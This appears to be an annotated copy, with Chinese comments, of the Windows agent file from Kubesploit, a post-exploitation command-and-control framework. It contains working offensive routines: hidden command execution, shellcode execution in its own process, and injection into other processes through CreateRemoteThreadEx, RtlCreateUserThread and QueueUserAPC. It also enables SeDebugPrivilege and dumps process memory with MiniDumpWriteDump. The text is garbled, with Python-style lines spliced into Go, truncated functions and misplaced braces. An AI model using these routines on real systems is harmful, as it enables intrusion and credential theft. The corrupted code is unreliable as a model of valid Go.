# `kubesploit\pkg\agent\exec_windows.go`

```
// +build windows
// 指定该文件在 Windows 平台下构建

// Kubesploit is a post-exploitation command and control framework built on top of Merlin by Russel Van Tuyl.
// This file is part of Kubesploit.
// Kubesploit 是基于 Russel Van Tuyl 的 Merlin 构建的后渗透命令和控制框架。
// 本文件是 Kubesploit 的一部分。

// Copyright (c) 2021 CyberArk Software Ltd. All rights reserved.
// 版权所有 2021 CyberArk Software Ltd.

// Kubesploit is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
// Kubesploit 是自由软件：您可以根据自由软件基金会发布的 GNU 通用公共许可证的条款重新分发和/或修改它，无论是许可证的第 3 版还是任何后续版本。

// Kubesploit is distributed in the hope that it will be useful for enhancing organizations' security.
// Kubesploit 希望能够有助于增强组织的安全性。

// Kubesploit shall not be used in any malicious manner.
// Kubesploit 不得以任何恶意方式使用。

// Kubesploit is distributed AS-IS, WITHOUT ANY WARRANTY; including the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// Kubesploit 按原样分发，不附带任何保证；包括但不限于适销性或特定用途适用性的默示保证。请参阅 GNU 通用公共许可证以获取更多详细信息。

// You should have received a copy of the GNU General Public License
// along with Kubesploit.  If not, see <http://www.gnu.org/licenses/>.
// 您应该已经收到了 GNU 通用公共许可证的副本，与 Kubesploit 一起。如果没有，请访问 <http://www.gnu.org/licenses/>。
package agent

import (
	// Standard
	"errors"  // 导入标准库中的 errors 包，用于处理错误
	"fmt"  // 导入标准库中的 fmt 包，用于格式化输出
	"io/ioutil"  // 导入标准库中的 ioutil 包，用于读取文件内容
	"os"  // 导入标准库中的 os 包，用于操作系统功能
	"os/exec"  // 导入标准库中的 exec 包，用于执行外部命令
	"syscall"  // 导入标准库中的 syscall 包，用于操作系统底层接口
	"unsafe"  // 导入标准库中的 unsafe 包，用于操作指针类型

	// Sub Repositories
	"golang.org/x/sys/windows"  // 导入子仓库中的 windows 包，用于操作 Windows 系统

	// 3rd Party
	"github.com/mattn/go-shellwords"  // 导入第三方库中的 go-shellwords 包，用于解析命令行参数
)

const (
// 定义常量 MEM_COMMIT，用于 Windows API 调用
MEM_COMMIT = 0x1000
// 定义常量 MEM_RESERVE，用于 Windows API 调用
MEM_RESERVE = 0x2000
// 定义常量 MEM_RELEASE，用于 Windows API 调用
MEM_RELEASE = 0x8000
// 定义常量 PAGE_EXECUTE，用于 Windows API 调用
PAGE_EXECUTE = 0x10
// 定义常量 PAGE_EXECUTE_READWRITE，用于 Windows API 调用
PAGE_EXECUTE_READWRITE = 0x40
// 定义常量 PAGE_READWRITE，用于 Windows API 调用
PAGE_READWRITE = 0x04
// 定义常量 PROCESS_CREATE_THREAD，用于 Windows API 调用
PROCESS_CREATE_THREAD = 0x0002
// 定义常量 PROCESS_VM_READ，用于 Windows API 调用
PROCESS_VM_READ = 0x0010
// 定义常量 PROCESS_VM_WRITE，用于 Windows API 调用
PROCESS_VM_WRITE = 0x0020
// 定义常量 PROCESS_VM_OPERATION，用于 Windows API 调用
PROCESS_VM_OPERATION = 0x0008
// PROCESS_QUERY_INFORMATION 是一个用于 Windows API 调用的 Windows 常量
PROCESS_QUERY_INFORMATION = 0x0400
// TH32CS_SNAPHEAPLIST 是一个用于 Windows API 调用的 Windows 常量
TH32CS_SNAPHEAPLIST = 0x00000001
// TH32CS_SNAPMODULE 是一个用于 Windows API 调用的 Windows 常量
TH32CS_SNAPMODULE = 0x00000008
// TH32CS_SNAPPROCESS 是一个用于 Windows API 调用的 Windows 常量
TH32CS_SNAPPROCESS = 0x00000002
// TH32CS_SNAPTHREAD 是一个用于 Windows API 调用的 Windows 常量
TH32CS_SNAPTHREAD = 0x00000004
// THREAD_SET_CONTEXT 是一个用于 Windows API 调用的 Windows 常量
THREAD_SET_CONTEXT = 0x0010
)

// ExecuteCommand 是一个函数，用于指示代理在主机操作系统上执行命令
func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
    var cmd *exec.Cmd

    // 解析参数字符串为参数数组
    argS, errS := shellwords.Parse(arg)
    if errS != nil {
		// 返回空字符串和格式化的错误信息，包括命令行参数和错误信息
		return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
	}

	// 使用提供的命令和参数创建一个命令对象
	cmd = exec.Command(name, argS...)

	// 设置命令对象的系统进程属性，隐藏窗口
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Only difference between this and agent.go

	// 执行命令并获取标准输出和标准错误
	out, err := cmd.CombinedOutput()
	stdout = string(out)
	stderr = ""

	// 如果有错误，将错误信息赋值给标准错误
	if err != nil {
		stderr = err.Error()
	}

	// 返回标准输出和标准错误
	return stdout, stderr
}

// ExecuteShellcodeSelf 在当前进程中执行提供的 shellcode
func ExecuteShellcodeSelf(shellcode []byte) error {
	// 使用 NewLazySystemDLL 函数创建 kernel32 对象，用于访问 kernel32.dll 中的函数
	kernel32 := windows.NewLazySystemDLL("kernel32")
	// 使用 NewLazySystemDLL 函数创建 ntdll 对象，用于访问 ntdll.dll 中的函数
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	// 通过 kernel32 对象的 NewProc 方法获取 VirtualAlloc 函数的指针
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	// 通过 ntdll 对象的 NewProc 方法获取 RtlCopyMemory 函数的指针
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	// 调用 VirtualAlloc 函数分配内存空间
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	// 检查 VirtualAlloc 函数调用是否出错
	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	// 检查分配的内存地址是否为 0
	if addr == 0 {
		return errors.New("VirtualAlloc failed and returned 0")
	}

	// 调用 RtlCopyMemory 函数将 shellcode 复制到分配的内存空间
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
```
在这段代码中，我们使用了 Windows API 中的一些函数来分配内存空间并将数据复制到该空间中。注释中解释了每个函数的作用以及对错误的处理。
// 检查 RtlCopyMemory 函数调用是否出错，如果出错则返回错误信息
if errRtlCopyMemory.Error() != "The operation completed successfully." {
    return errors.New("Error calling RtlCopyMemory:\r\n" + errRtlCopyMemory.Error())
}

// TODO 设置初始内存分配为可读写，并更新为可执行；当前获取到 "The parameter is incorrect." 错误
/*	_, _, errVirtualProtect := VirtualProtect.Call(uintptr(addr), uintptr(len(shellcode)), PAGE_EXECUTE)
if errVirtualProtect.Error() != "The operation completed successfully." {
    return errVirtualProtect
}*/

// 在目标进程中执行 shellcode
_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)
if errSyscall != 0 {
    return errors.New("Error executing shellcode syscall:\r\n" + errSyscall.Error())
}

return nil
}

// ExecuteShellcodeRemote 在提供的目标进程中执行提供的 shellcode
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
// 使用 NewLazySystemDLL 函数加载 kernel32.dll 动态链接库
kernel32 := windows.NewLazySystemDLL("kernel32")

// 使用 NewProc 函数获取指定函数的地址
VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
CloseHandle := kernel32.NewProc("CloseHandle")

// 使用 OpenProcess 函数打开指定进程，获取进程句柄
pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

// 如果打开进程出现错误，则返回错误信息
if errOpenProcess != nil {
    return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
}

// 使用 VirtualAllocEx 函数在指定进程中分配内存空间
addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

// 如果分配内存出现错误，则返回错误信息
if errVirtualAlloc.Error() != "The operation completed successfully." {
    return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
}
# 如果地址为0，则说明VirtualAllocEx失败并返回0，返回错误信息
if addr == 0:
    return errors.New("VirtualAllocEx failed and returned 0")

# 调用WriteProcessMemory函数，将shellcode写入到指定进程的内存空间中
_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

# 如果调用WriteProcessMemory函数出现错误，则返回错误信息
if errWriteProcessMemory.Error() != "The operation completed successfully.":
    return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())

# 调用VirtualProtectEx函数，设置指定内存区域的访问权限为可执行
_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
# 如果调用VirtualProtectEx函数出现错误，则返回错误信息
if errVirtualProtectEx.Error() != "The operation completed successfully.":
    return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())

# 调用CreateRemoteThreadEx函数，在指定进程中创建一个新的线程，并在指定地址处执行
_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
# 如果调用CreateRemoteThreadEx函数出现错误，则返回错误信息
if errCreateRemoteThreadEx.Error() != "The operation completed successfully.":
    return errors.New("Error calling CreateRemoteThreadEx:\r\n" + errCreateRemoteThreadEx.Error())
	// 调用 CloseHandle 函数关闭指定句柄
	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	// 检查关闭句柄操作是否成功，如果不成功则返回错误信息
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	// 执行提供的 shellcode 在提供的目标进程中，使用 Windows RtlCreateUserThread 调用
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
	// 加载 kernel32 和 ntdll 动态链接库
	kernel32 := windows.NewLazySystemDLL("kernel32")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	// 获取所需函数的指针
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CloseHandle := kernel32.NewProc("CloseHandle")
	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
// 使用系统调用打开进程，获取进程句柄
pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

// 如果打开进程出现错误，返回错误信息
if errOpenProcess != nil {
    return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
}

// 在进程中分配内存空间
addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

// 如果分配内存出现错误，返回错误信息
if errVirtualAlloc.Error() != "The operation completed successfully." {
    return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
}

// 如果分配的地址为0，表示分配失败，返回错误信息
if addr == 0 {
    return errors.New("VirtualAllocEx failed and returned 0")
}

// 将 shellcode 写入进程的内存空间
_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

// 如果写入内存出现错误，返回错误信息
if errWriteProcessMemory.Error() != "The operation completed successfully." {
    return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
}
	}

	// 调用 VirtualProtectEx 函数修改内存区域的保护属性，使其可执行
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	// 检查 VirtualProtectEx 函数调用是否成功，如果不成功则返回错误信息
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	/*
		NTSTATUS
		RtlCreateUserThread(
			IN HANDLE Process,
			IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
			IN BOOLEAN CreateSuspended,
			IN ULONG ZeroBits OPTIONAL,
			IN SIZE_T MaximumStackSize OPTIONAL,
			IN SIZE_T CommittedStackSize OPTIONAL,
			IN PUSER_THREAD_START_ROUTINE StartAddress,
			IN PVOID Parameter OPTIONAL,
			OUT PHANDLE Thread OPTIONAL,
			OUT PCLIENT_ID ClientId OPTIONAL
	*/
```

	*/
	// 声明一个变量 tHandle 用于存储线程句柄
	var tHandle uintptr
	// 调用 RtlCreateUserThread 函数创建用户线程
	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
	// 检查 RtlCreateUserThread 调用是否成功，如果不成功则返回错误信息
	if errRtlCreateUserThread.Error() != "The operation completed successfully." {
		return errors.New("Error calling RtlCreateUserThread:\r\n" + errRtlCreateUserThread.Error())
	}
	// 调用 WaitForSingleObject 函数等待线程结束
	_, _, errWaitForSingleObject := WaitForSingleObject.Call(tHandle, syscall.INFINITE)
	// 检查 WaitForSingleObject 调用是否成功，如果不成功则返回错误信息
	if errWaitForSingleObject.Error() != "The operation completed successfully." {
		return errors.New("Error calling WaitForSingleObject:\r\n" + errWaitForSingleObject.Error())
	}
	// 调用 CloseHandle 函数关闭进程句柄
	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	// 检查 CloseHandle 调用是否成功，如果不成功则返回错误信息
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}
	// 如果以上操作都成功，则返回 nil 表示没有错误
	return nil
// ExecuteShellcodeQueueUserAPC函数用于在提供的目标进程中使用Windows QueueUserAPC API调用执行提供的shellcode
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
    // TODO 这可以是本地或远程的
    // 使用LazySystemDLL函数从kernel32.dll中加载API函数
    kernel32 := windows.NewLazySystemDLL("kernel32")

    // 获取API函数的指针
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    CloseHandle := kernel32.NewProc("CloseHandle")
    CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
    QueueUserAPC := kernel32.NewProc("QueueUserAPC")
    Thread32First := kernel32.NewProc("Thread32First")
    Thread32Next := kernel32.NewProc("Thread32Next")
    OpenThread := kernel32.NewProc("OpenThread")

    // 考虑使用NtQuerySystemInformation替换CreateToolhelp32Snapshot并找到等待状态中的线程
    // https://stackoverflow.com/questions/22949725/how-to-get-thread-state-e-g-suspended-memory-cpu-usage-start-time-priori
}
	// 使用系统调用打开进程，获取进程句柄
	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	// 如果打开进程出现错误，返回错误信息
	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}
	// 创建进程快照，获取系统快照句柄
	sHandle, _, errCreateToolhelp32Snapshot := CreateToolhelp32Snapshot.Call(TH32CS_SNAPHEAPLIST|TH32CS_SNAPMODULE|TH32CS_SNAPPROCESS|TH32CS_SNAPTHREAD, uintptr(pid))
	// 如果创建快照出现错误，返回错误信息
	if errCreateToolhelp32Snapshot.Error() != "The operation completed successfully." {
		return errors.New("Error calling CreateToolhelp32Snapshot:\r\n" + errCreateToolhelp32Snapshot.Error())
	}

	// 在指定进程中分配内存空间
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	// 如果分配内存出现错误，返回错误信息
	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	// 如果内存地址为0，表示分配失败，返回错误信息
	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	// 调用 WriteProcessMemory 函数，将 shellcode 写入指定进程的内存地址
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	// 检查 WriteProcessMemory 调用是否出错，如果出错则返回错误信息
	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	// 调用 VirtualProtectEx 函数，设置指定内存区域的访问权限为可执行
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	// 检查 VirtualProtectEx 调用是否出错，如果出错则返回错误信息
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	// 定义 THREADENTRY32 结构体，用于获取线程信息
	type THREADENTRY32 struct {
		dwSize             uint32
		cntUsage           uint32
		th32ThreadID       uint32
		th32OwnerProcessID uint32
		tpBasePri          int32
		tpDeltaPri         int32
		// 定义一个名为dwFlags的uint32变量
		dwFlags            uint32
	}
	// 创建一个THREADENTRY32类型的变量t，并设置其dwSize属性为t的大小
	var t THREADENTRY32
	t.dwSize = uint32(unsafe.Sizeof(t))

	// 调用Thread32First函数，获取进程的第一个线程信息
	_, _, errThread32First := Thread32First.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
	// 检查Thread32First函数的返回错误，如果不是"The operation completed successfully."，则返回错误信息
	if errThread32First.Error() != "The operation completed successfully." {
		return errors.New("Error calling Thread32First:\r\n" + errThread32First.Error())
	}
	// 定义变量i为true，x为0
	i := true
	x := 0
	// 对每个线程排队一个APC；非常不稳定且不理想，需要以编程方式找到可警报的线程
	for i {
		// 调用Thread32Next函数，获取下一个线程信息
		_, _, errThread32Next := Thread32Next.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
		// 检查Thread32Next函数的返回错误，如果是"There are no more files."，则执行以下操作
		if errThread32Next.Error() == "There are no more files." {
			// 如果x等于1，则返回错误信息
			if x == 1 {
				// 当使用"spray all threads"技术时，不要排队到主线程，经常导致进程崩溃
				return errors.New("the process only has 1 thread; APC not queued")
			}
# 初始化变量 i 为 false
i = false
# 跳出循环
break
# 如果调用 Thread32Next 出现错误并且错误信息不是 "The operation completed successfully."，则返回错误信息
else if errThread32Next.Error() != "The operation completed successfully." {
    return errors.New("Error calling Thread32Next:\r\n" + errThread32Next.Error())
}
# 如果线程的所有者进程 ID 等于给定的进程 ID
if t.th32OwnerProcessID == pid {
    # 如果 x 大于 0
    if x > 0 {
        # 调用 OpenThread 函数打开线程
        tHandle, _, errOpenThread := OpenThread.Call(THREAD_SET_CONTEXT, 0, uintptr(t.th32ThreadID))
        # 如果打开线程出现错误并且错误信息不是 "The operation completed successfully."，则返回错误信息
        if errOpenThread.Error() != "The operation completed successfully." {
            return errors.New("Error calling OpenThread:\r\n" + errOpenThread.Error())
        }
        # 调用 QueueUserAPC 函数将用户模式异步过程调用（APC）插入到线程的 APC 队列中
        _, _, errQueueUserAPC := QueueUserAPC.Call(addr, tHandle, 0)
        # 如果调用 QueueUserAPC 出现错误并且错误信息不是 "The operation completed successfully."，则返回错误信息
        if errQueueUserAPC.Error() != "The operation completed successfully." {
            return errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
        }
        # x 自增
        x++
        # 调用 CloseHandle 函数关闭线程句柄
        _, _, errCloseHandle := CloseHandle.Call(tHandle)
        # 如果调用 CloseHandle 出现错误并且错误信息不是 "The operation completed successfully."，则返回错误信息
        if errCloseHandle.Error() != "The operation completed successfully." {
            return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
// 如果进程句柄无效，则返回错误
if pHandle == 0 {
    return errors.New("Invalid process handle")
}

// 尝试使用 Windows MiniDumpWriteDump API 操作来生成进程的转储文件
// 并将转储文件的原始字节作为服务器上传返回
// 如果操作失败，则返回错误信息
// 在转储过程中触及磁盘，在操作系统默认临时目录或提供的临时目录中
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
    var mini map[string]interface{}
    mini = make(map[string]interface{})
    var err error

    // 在执行 miniDump 功能之前，确保临时目录存在
    if tempDir != "" {
        d, errS := os.Stat(tempDir)
        if os.IsNotExist(errS) {
            return mini, fmt.Errorf("提供的目录不存在：%s", tempDir)
        }
        if d.IsDir() != true {
            return mini, fmt.Errorf("提供的路径不是有效的目录：%s", tempDir)
        }
    } else {
        tempDir = os.TempDir()
    }

    // 获取进程的 PID 或名称
	// 将进程名称、进程ID和错误信息赋值给mini字典中的对应键
	mini["ProcName"], mini["ProcID"], err = getProcess(process, inPid)
	// 如果出现错误，返回mini字典和错误信息
	if err != nil {
		return mini, err
	}

	// 获取调试权限（用于转储非当前用户拥有的进程）
	err = sePrivEnable("SeDebugPrivilege")
	// 如果出现错误，返回mini字典和错误信息
	if err != nil {
		return mini, err
	}

	// 获取进程的句柄
	hProc, err := syscall.OpenProcess(0x1F0FFF, false, mini["ProcID"].(uint32)) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
	// 如果出现错误，返回mini字典和错误信息
	if err != nil {
		return mini, err
	}

	// 设置临时文件用于写入数据，并在完成后自动删除
	// TODO: 想办法在内存中完成这个操作
	f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
// 如果 tempErr 不为 nil，则返回 mini 和 tempErr
if tempErr != nil {
    return mini, tempErr
}

// 无论是否出现错误，函数退出后都会删除文件
defer os.Remove(f.Name())

// 从 DbgHelp.dll 中加载 MiniDumpWriteDump 函数
k32 := windows.NewLazySystemDLL("DbgHelp.dll")
miniDump := k32.NewProc("MiniDumpWriteDump")

/*
    MiniDumpWriteDump 函数的参数说明：
    - hProcess: 进程句柄
    - ProcessId: 进程 ID
    - hFile: 文件句柄
    - DumpType: dump 类型
    - ExceptionParam: 异常信息
    - UserStreamParam: 用户流信息
    - CallbackParam: 回调信息
*/
		);
	*/
	// 调用 Windows MiniDumpWriteDump API
	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(mini["ProcID"].(uint32)), f.Fd(), 3, 0, 0, 0)

	f.Close() // 不知道为什么关闭文件会解决“与磁盘上的文件不一致”的问题，但它确实解决了

	if r != 0 {
		// 读取文件内容到 mini["FileContent"] 中
		mini["FileContent"], err = ioutil.ReadFile(f.Name())
		if err != nil {
			f.Close()
			return mini, err
		}
	}
	// 返回 mini 和 nil
	return mini, nil
}

// getProcess 接受进程名或进程ID，并返回指向进程句柄、进程名和进程ID的指针。
func getProcess(name string, pid uint32) (string, uint32, error) {
	// 如果进程ID小于等于0并且进程名为空，则返回错误
	if pid <= 0 && name == "" {
		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
	}

	// 创建进程快照
	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if snapshotHandle < 0 || err != nil {
		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
	}
	// 延迟关闭快照句柄
	defer syscall.CloseHandle(snapshotHandle)

	// 初始化进程信息结构体
	var process syscall.ProcessEntry32
	process.Size = uint32(unsafe.Sizeof(process))
	// 获取快照中的第一个进程信息
	err = syscall.Process32First(snapshotHandle, &process)
	if err != nil {
		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
	}

	// 循环遍历进程快照
	for {
		processName := ""
		// 初始化进程名为空字符串
		// Iterate over characters to build a full string
		// 遍历进程的 ExeFile 属性中的字符，构建完整的字符串
		for _, chr := range process.ExeFile {
			// 如果字符不为 0，则将其转换为字符串并添加到 processName 中
			if chr != 0 {
				processName = processName + string(int(chr))
			}
		}
		// 如果 pid 大于 0
		if pid > 0 {
			// 如果进程的 ProcessID 等于 pid，则返回进程名、pid 和空错误
			if process.ProcessID == pid {
				return processName, pid, nil
			}
		} else if name != "" {
			// 如果 name 不为空
			// 如果进程名等于 name，则返回 name、进程的 ProcessID 和空错误
			if processName == name {
				return name, process.ProcessID, nil
			}
		}
		// 获取下一个进程的信息
		err = syscall.Process32Next(snapshotHandle, &process)
		// 如果出现错误，则跳出循环
		if err != nil {
			break
		}
	}
	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
}

// sePrivEnable函数用于调整当前进程的特权，以添加传入的特权字符串。适用于设置'SeDebugPrivilege'
func sePrivEnable(s string) error {
	// 定义LUID结构体，用于表示特权的本地唯一标识符
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	// 定义LUID_AND_ATTRIBUTES结构体，用于表示特权的LUID和属性
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	// 定义TOKEN_PRIVILEGES结构体，用于表示特权的数量和具体特权
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}
	// 使用windows包中的NewLazySystemDLL函数加载advapi32.dll库
	modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
// 使用 modadvapi32 包的 NewProc 方法创建 AdjustTokenPrivileges 函数的指针
procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

// 使用 modadvapi32 包的 NewProc 方法创建 LookupPrivilegeValueW 函数的指针
procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")

// 声明一个变量 tokenHandle 用于存储 token
var tokenHandle syscall.Token

// 获取当前进程的句柄
thsHandle, err := syscall.GetCurrentProcess()
if err != nil {
    return err
}

// 打开当前进程的访问令牌
syscall.OpenProcessToken(
    thsHandle,                       //  HANDLE  ProcessHandle,
    syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
    &tokenHandle,                    //	PHANDLE TokenHandle
)

// 声明一个变量 luid 用于存储特权的本地唯一标识符
var luid LUID

// 调用 LookupPrivilegeValueW 函数获取特权的本地唯一标识符
r, _, e := procLookupPriv.Call(
    uintptr(0), //LPCWSTR lpSystemName,
    uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
    uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
)
// 如果返回值为0，表示出现错误，直接返回错误信息
if r == 0 {
    return e
}
// 定义特权值为SE_PRIVILEGE_ENABLED
SE_PRIVILEGE_ENABLED := uint32(0x00000002)
// 初始化特权结构体，设置特权数量为1
privs := TOKEN_PRIVILEGES{}
privs.PrivilegeCount = 1
// 设置特权结构体中的特权信息
privs.Privileges[0].Luid = luid
privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
// 调用系统API，调整当前进程的访问令牌特权
r, _, e = procAdjustTokenPrivileges.Call(
    uintptr(tokenHandle),
    uintptr(0),
    uintptr(unsafe.Pointer(&privs)),
    uintptr(0),
    uintptr(0),
    uintptr(0),
)
// 如果返回值为0，表示出现错误，直接返回错误信息
if r == 0 {
    return e
}
# 返回空值，表示没有返回任何有效的数据。
```